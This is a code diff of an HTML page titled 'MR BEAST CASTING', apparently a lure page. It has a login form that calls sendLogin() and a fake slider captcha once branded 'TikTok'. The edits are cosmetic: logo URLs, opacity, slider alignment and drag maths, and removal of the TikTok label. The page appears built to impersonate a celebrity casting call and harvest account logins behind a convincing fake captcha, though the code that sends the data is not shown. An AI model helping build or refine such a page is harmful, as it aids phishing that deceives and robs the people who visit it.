@@ -23,10 +23,9 @@
         .bg-pattern { 
             position: fixed; 
             top: 0; left: 0; width: 100%; height: 100%; 
-            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') repeat; 
+            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') repeat; 
             background-size: 60px; 
-            /* THE 75% FIX: Opacity updated as requested */
-            opacity: 0.75; 
+            opacity: 0.75; /* 75% VISIBILITY FIXED */
             z-index: 0; 
             animation: float 20s ease-in-out infinite; 
         }
@@ -73,11 +72,24 @@
             background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') center/contain no-repeat; 
             transform: rotate(140deg); transition: transform 0.1s; 
         }
-        .slider-track { position: absolute; bottom: 15px; left: 40px; right: 40px; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; }
+        .slider-track { position: absolute; bottom: 25px; left: 40px; right: 40px; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; }
         .slider-handle { 
-            position: absolute; bottom: -15px; left: 0; width: 40px; height: 40px; 
-            background: var(--blue); border-radius: 50%; cursor: grab; 
-            display: flex; align-items: center; justify-content: center; font-weight: 900; color: #000; box-shadow: 0 0 15px var(--blue); 
+            position: absolute; 
+            top: 50%; /* VERTICAL ALIGN */
+            left: 0; 
+            width: 42px; 
+            height: 42px; 
+            transform: translateY(-50%); /* PERFECT MIDDLE CENTER */
+            background: var(--blue); 
+            border-radius: 50%; 
+            cursor: grab; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-weight: 900; 
+            color: #000; 
+            box-shadow: 0 0 15px var(--blue); 
+            font-size: 20px;
         }
         
         .captcha-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 8px; }
@@ -90,7 +102,7 @@
 </head>
 <body>
     <div class="bg-pattern"></div>
-    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="top-logo">
+    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo">
     <div class="box">
         <div id="login_section">
             <span class="mr-glow">MR</span><span class="beast-style"> BEAST CASTING</span>
@@ -100,7 +112,8 @@
             <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
         <div id="captcha_ui">
-            <p class="captcha-title">Drag The Slider to Fit The Puzzle | TikTok</p>
+            <!-- TIKTOK BRANDING REMOVED -->
+            <p class="captcha-title">Drag The Slider to Fit The Puzzle</p>
             <div class="captcha-container" id="captchaContainer">
                 <div class="captcha-bg"></div>
                 <div class="rotate-outer"><div class="rotate-inner" id="rotateImg"></div></div>
@@ -133,10 +146,10 @@
             const move = (e) => {
                 if (!dragging) return;
                 const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-                let x = clientX - track.getBoundingClientRect().left - 20;
-                if (x < 0) x = 0; if (x > track.offsetWidth - 40) x = track.offsetWidth - 40;
+                let x = clientX - track.getBoundingClientRect().left - 21;
+                if (x < 0) x = 0; if (x > track.offsetWidth - 42) x = track.offsetWidth - 42;
                 handle.style.left = x + 'px';
-                let rot = 140 + (x / (track.offsetWidth - 40)) * 220;
+                let rot = 140 + (x / (track.offsetWidth - 42)) * 220;
                 img.style.transform = `rotate(${rot}deg)`;
                 if (rot > 355 && rot < 365) { 
                     dragging = false; handle.style.background = "#00ff88"; 
